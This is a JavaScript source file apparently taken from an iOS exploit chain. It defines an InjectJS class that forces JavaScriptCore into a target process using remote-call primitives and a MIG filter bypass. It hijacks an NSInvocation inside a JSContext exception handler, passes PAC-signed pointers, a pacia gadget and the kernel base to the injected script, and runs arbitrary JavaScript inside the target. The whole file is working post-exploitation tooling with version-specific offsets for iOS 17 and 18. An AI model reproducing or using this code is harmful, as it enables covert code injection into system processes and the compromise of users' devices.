import Utils from "libs/JSUtils/Utils";
import RemoteCall from "libs/TaskRop/RemoteCall";
import Chain from "libs/Chain/Chain";

const TAG = "INJECTJS";

const RTLD_LAZY = 0x1;
const RTLD_DEFAULT = 0xfffffffffffffffen;

export default class InjectJS {

	task;
	#target;
	#injectCode;
	#migFilterBypass;
	#invokingAddr;
	#JSContextClass;
	#NSMethodSignatureClass;
	#NSInvocationClass;
	#invokeUsingIMPSel;

	constructor(target, injectCode, migFilterBypass=null) {
		this.#target = target;
		this.#injectCode = injectCode;
		this.#migFilterBypass = migFilterBypass;
		this.#invokingAddr = this.#findInvoking();

		this.#JSContextClass = Native.callSymbol("objc_getClass", "JSContext");
		this.#NSMethodSignatureClass = Native.callSymbol("objc_getClass", "NSMethodSignature");
		this.#NSInvocationClass = Native.callSymbol("objc_getClass", "NSInvocation");
		this.#invokeUsingIMPSel = Native.callSymbol("sel_registerName", "invokeUsingIMP:"); 

		if (!this.#invokingAddr)
			console.log(TAG, "Invoking not found!");
	}

	inject(agentPid=0) {
		if (!this.#invokingAddr)
			return false;

		if (typeof(this.#target) == "string") {
			console.log(TAG, `Start injecting JS script into ${this.#target}`);

			this.task = new RemoteCall(this.#target, this.#migFilterBypass);
			if (!this.task.success()) {
				console.log(TAG, "Unable to inject into: " + this.#target);
				return false;
			}
		}
		else {
			console.log(TAG, `Start injecting JS script into existing task: ${this.#target.pid()}`);

			 // Assume target is a RemoteCall object
			this.task = this.#target;
			if (!this.task.success()) {
				console.log(TAG, "Unable to inject into existing task");
				return false;
			}
		}

		this.#startWithTask(agentPid);
		return true;
	}

	destroy() {
		if (this.task && this.task.success())
			this.task.destroy();
		this.task = null;
	}

	#startWithTask(agentPid) {
		const mem = this.task.mem();
		const krwCtx = this.task.krwCtx();

		// Sign __invoking__ function address
		this.#invokingAddr = this.task.pac(this.#invokingAddr, 0);
		//console.log(TAG, "Signed invoking: " + Utils.hex(this.#invokingAddr));

		this.task.writeStr(mem, "/System/Library/Frameworks/JavaScriptCore.framework/JavaScriptCore");
		const lib = this.task.call(1000, "dlopen", mem, RTLD_LAZY);
		//console.log(TAG, "lib: " + Utils.hex(lib));

		// Create a JSC context and get pointer to exceptionHandler NSBlock
		const jscontext = this.#callObjcRetain(this.#JSContextClass, "new");
		//console.log(TAG, "Remote JSC: " + Utils.hex(jscontext));

		const exceptionHandler = this.task.read64(jscontext + 0x28n);
		//console.log(TAG, "Exception handler: " + Utils.hex(exceptionHandler));

		// Register an "invoker()" JS function within our JSC context, having exceptionHandler block as native implementation.
		// We replace exceptionHandler NSInvocation later in this code.
		const invokerStr = this.#writeCFStr(mem, "invoker");
		this.#callObjc(jscontext, "setObject:forKeyedSubscript:", exceptionHandler, invokerStr);
		//console.log(TAG, "invokerStr: " + Utils.hex(invokerStr));

		// Retrieve JSValue of invoker inside JSC context dict
		const invoker = this.#callObjc(jscontext, "objectForKeyedSubscript:", invokerStr);
		//console.log(TAG, "invoker: " + Utils.hex(invoker));

		// Get pointer of NSInvocation inside NSBlock
		const fjval = this.task.read64(invoker + 0x8n);
		const storval = this.task.read64(fjval + 0x40n);
		const invokerObj = this.task.read64(storval + 0x10n);
		//console.log(TAG, "invokerObj: " + Utils.hex(invokerObj));

		this.task.writeStr(mem, "QQQQQQQQQQQQQQQ");
		const lsignature = this.#callObjc(this.#NSMethodSignatureClass, "signatureWithObjCTypes:", mem);

		this.task.writeStr(mem, "@QQQQQQQQQQQQQQ");
		const osignature = this.#callObjc(this.#NSMethodSignatureClass, "signatureWithObjCTypes:", mem);

		// This is an utility NSInvocation object we share with JS to allow objc call with retained return object
		const oinv = this.#callObjcRetain(this.#NSInvocationClass, "invocationWithMethodSignature:", osignature);

		// This is the final NSInvocation object we use to call the actual target function
		const inv = this.#callObjcRetain(this.#NSInvocationClass, "invocationWithMethodSignature:", lsignature);
		//console.log(TAG, "inv: " + Utils.hex(inv));

		// Create a new NSInvocation and replace the NSBlock one with this
		const jsinv = this.#callObjcRetain(this.#NSInvocationClass, "invocationWithMethodSignature:", lsignature);
		//console.log(TAG, "jsinv: " + Utils.hex(jsinv));

		const callBuff = this.task.call(100, "calloc", 1, 0x4000);
		const firstInvokingBuff = callBuff + 0x50n;	// callBuff[10]
		const argsBuff = callBuff + 0x320n;			// callBuff[100]
		const resultBuff = callBuff + 0x640n;		// callBuff[200]

		//console.log(TAG, "callBuff: " + Utils.hex(callBuff));
		//console.log(TAG, "firstInvokingBuff: " + Utils.hex(firstInvokingBuff));
		//console.log(TAG, "argsBuff: " + Utils.hex(argsBuff));
		//console.log(TAG, "resultBuff: " + Utils.hex(resultBuff));

		// Share callBuff with JS
		this.task.writeStr(mem, "nativeCallBuff");
		const jsctx = this.#callObjc(jscontext, "JSGlobalContextRef");
		const nativeCallBuff = this.task.call(100, "JSObjectMakeArrayBufferWithBytesNoCopy", jsctx, callBuff, 0x4000);
		const globalObject = this.task.call(100, "JSContextGetGlobalObject", jsctx);
		const jsName = this.task.call(100, "JSStringCreateWithUTF8CString", mem);
		this.task.call(100, "JSObjectSetProperty", jsctx, globalObject, jsName, nativeCallBuff);

		let localCallBuff = new BigUint64Array(33);
		
		// Second (final) __invoking__ arguments
		localCallBuff[0] = 0x41414141n;	// this should be overwritten at every function call
		localCallBuff[1] = resultBuff; // Result buffer
		localCallBuff[2] = argsBuff; // Arguments buffer
		localCallBuff[3] = 0x120n; // args buff size. Do not touch!

		// First __invoking__ arguments
		localCallBuff[10] = this.#invokingAddr;
		localCallBuff[11] = resultBuff;
		localCallBuff[12] = callBuff;
		localCallBuff[13] = 0xe0n;

		// Some offsets we export to JS
		localCallBuff[20] = callBuff;
		localCallBuff[21] = this.task.pac( Native.callSymbol("dlsym", RTLD_DEFAULT, "dlsym"), 0 );
		localCallBuff[22] = this.task.pac( Native.callSymbol("dlsym", RTLD_DEFAULT, "memcpy"), 0 );
		localCallBuff[23] = this.task.pac( Native.callSymbol("dlsym", RTLD_DEFAULT, "malloc"), 0 );
		localCallBuff[24] = oinv;
		localCallBuff[25] = jsctx;
		localCallBuff[26] = true ? 1n : 0;	// we pass true if DEBUG is set
		localCallBuff[27] = 1n;
		localCallBuff[28] = 0n;
		localCallBuff[29] = 0n;
		localCallBuff[30] = Chain.getKernelBase();
		let desiredPacGadget = Chain.getPaciaGadget();
		// retreiving correct modifier for 18.4 and above
		if (globalThis.xnuVersion.major == 24 && globalThis.xnuVersion.minor >= 4) {
			desiredPacGadget = Native.pacia(Native.strip(desiredPacGadget),0n);
		}
		localCallBuff[31] = desiredPacGadget;
		localCallBuff[32] = BigInt(agentPid);

		//console.log(TAG, "dlsym: " + Utils.hex(localCallBuff[21]));
		//console.log(TAG, "memcpy: " + Utils.hex(localCallBuff[22]));
		//console.log(TAG, "malloc: " + Utils.hex(localCallBuff[23]));

		const nativeLocalBuff = Native.callSymbol("malloc", localCallBuff.byteLength);
		Native.write(nativeLocalBuff, localCallBuff.buffer);
		this.task.write(callBuff, nativeLocalBuff, localCallBuff.byteLength);
		Native.callSymbol("free", nativeLocalBuff);

		this.#callObjc(inv, "setArgument:atIndex:", firstInvokingBuff, 0);
		this.#callObjc(inv, "setArgument:atIndex:", firstInvokingBuff + 0x8n, 1);
		this.#callObjc(inv, "setArgument:atIndex:", firstInvokingBuff + 0x10n, 2);
		this.#callObjc(inv, "setArgument:atIndex:", firstInvokingBuff + 0x18n, 3);

		// This NSInvocation should in turn call the final NSInvocation we created before,
		// but with fully controlled arguments
		this.task.write64(mem, this.#invokingAddr);
		this.#callObjc(jsinv, "setTarget:", inv);
		this.#callObjc(jsinv, "setSelector:", this.#invokeUsingIMPSel);
		this.#callObjc(jsinv, "setArgument:atIndex:", mem, 2);

		// Replace NSInvocation
		this.task.write64(storval + 0x10n, jsinv);
		this.task.write64(storval + 0x18n, 0n);
		//console.log(TAG, "NSInvocation replaced");

		// Write loader.js in remote task
		//const loaderJS = "let buff = new BigUint64Array(this.nativeCallBuff); buff[0] = 0x41414141n; buff[100] = 0x11111111n; invoker();";
		console.log(TAG, "JS script length: " + this.#injectCode.length);
		const scriptMem = this.task.call(100, "calloc", 1, this.#injectCode.length + 1);
		const scriptStr = this.#writeCFStr(scriptMem, this.#injectCode);
		this.task.call(100, "free", scriptMem);
		//console.log(TAG, "scriptStr: " + Utils.hex(scriptStr));

		// Check if we write ok
		// console.log(TAG,"Check if we write ok" )
		// const a = Native.callSymbol("malloc", this.#injectCode.length + 1);
		// const len = this.#callObjc(scriptStr, "length");
		// console.log(TAG, len);
		// const b = this.#callObjc(scriptStr, "UTF8String");
		// this.task.read(b, a, this.#injectCode.length + 1);
		// const c = Native.readString(a, this.#injectCode.length);
		// console.log(TAG, c);
		

		//const loaderStr = this.#writeCFStr(mem, "loader");
		//this.#callObjc(jscontext, "setObject:forKeyedSubscript:", scriptStr, loaderStr);
		//console.log(TAG, "loaderStr: " + Utils.hex(loaderStr));

		console.log(TAG, "Starting JS script for target: " + this.#target);

		//const evaluateStr = this.#writeCFStr(mem, "let buff = new BigUint64Array(this.nativeCallBuff); buff[0] = 0x41414141n; buff[100] = 0x11111111n; invoker();");
		//const evaluateStr = this.#writeCFStr(mem, "invoker();");
		//const evaluateStr = this.#writeCFStr(mem, "eval(loader);");
		//const evaluateStr = this.#writeCFStr(mem, scriptStr);
		this.#callObjcInBackground(jscontext, "evaluateScript:", scriptStr);
		//this.#callObjcInBackground(jscontext, "evaluateScript:", scriptStr);
		//this.#callObjc(jscontext, "evaluateScript:", evaluateStr);

		// Read data from result
		//const retVal = this.task.read64(resultBuff);
		//console.log(TAG, "Result: " + retVal);

		console.log(TAG, "All done!");

		return true;
	}

	#findInvoking() {
		//console.log(TAG, "Find 'invoking()'...");

		let startAddr = Native.dlsym("_CF_forwarding_prep_0");
		startAddr = startAddr & 0x7fffffffffn; //Chain.strip(startAddr);
		//console.log(TAG, "startAddr: " + Utils.hex(startAddr));

		if (!startAddr)
			return 0;

		if (xnuVersion.major == 24 && xnuVersion.minor >= 5)
			startAddr -= 0x2500n;
		else
			startAddr -= 0x4000n;

		const pattern = new Uint8Array([0x67, 0x1D, 0x40, 0xF9, 0x66, 0x19, 0x40, 0xF9, 0x65, 0x15, 0x40, 0xF9, 0x64, 0x11, 0x40, 0xF9]);
		Native.write(Native.mem, pattern.buffer);
		let foundAddr = Native.callSymbol("memmem", startAddr, 0x4000, Native.mem, 16);
		//console.log(TAG, "foundAddr: " + Utils.hex(foundAddr));

		if (!foundAddr) {
			// special case for iOS 17.4-17.4.1
			//console.log(TAG,`Didnt found invoking,trying to find it for special version`);
			startAddr = Native.dlsym("CFCharacterSetIsCharacterMember");
			startAddr = startAddr & 0x7fffffffffn;
			foundAddr = Native.callSymbol("memmem", startAddr, 0x4000, Native.mem, 16);
			//console.log(TAG,`foundAddr:${Utils.hex(foundAddr)}`);
			if (!foundAddr)
				return 0;
		}

		const buff = Native.read(foundAddr - BigInt(Native.memSize), Native.memSize);
		const buff32 = new Uint32Array(buff);

		for (let i=buff32.length-1; i>=0; i--) {
			foundAddr -= 0x4n;
			if (buff32[i] == 0xd503237f) {
				const found = foundAddr;
				console.log(TAG, "Invoking found: " + Utils.hex(found));
				return found;
			}
		}

		return 0;
	}

	#callObjc(obj, selName, ...args) {
		const sel = Native.callSymbol("sel_registerName", selName);
		return this.task.call(1000, "objc_msgSend", obj, sel, ...args);
	}

	#callObjcRetain(obj, selName, ...args) {
		const ret = this.#callObjc(obj, selName, ...args);
		this.#callObjc(ret, "retain");
		return ret;
	}

	#callObjcInBackground(obj, selName, ...args) {
		const performSelectorInBackground = Native.callSymbol("sel_registerName", "performSelectorInBackground:withObject:");
		const sel = Native.callSymbol("sel_registerName", selName);
		return this.task.call(1000, "objc_msgSend", obj, performSelectorInBackground, sel, ...args);
	}

	#writeCFStr(dst, str) {
		const kCFStringEncodingUTF8 = 0x08000100;
		this.task.writeStr(dst, str);
		return this.task.call(100, "CFStringCreateWithCString", 0, dst, kCFStringEncodingUTF8);
	}

	#printClass(obj) {
		const cl = this.#callObjc(obj, "class");
		const desc = this.#callObjc(cl, "description");
		const str = this.#callObjc(desc, "UTF8String");
		this.task.read(str, Native.mem, 32);
		const classDesc = Native.readString(Native.mem);
		console.log(TAG, "class: " + classDesc);
	}
}
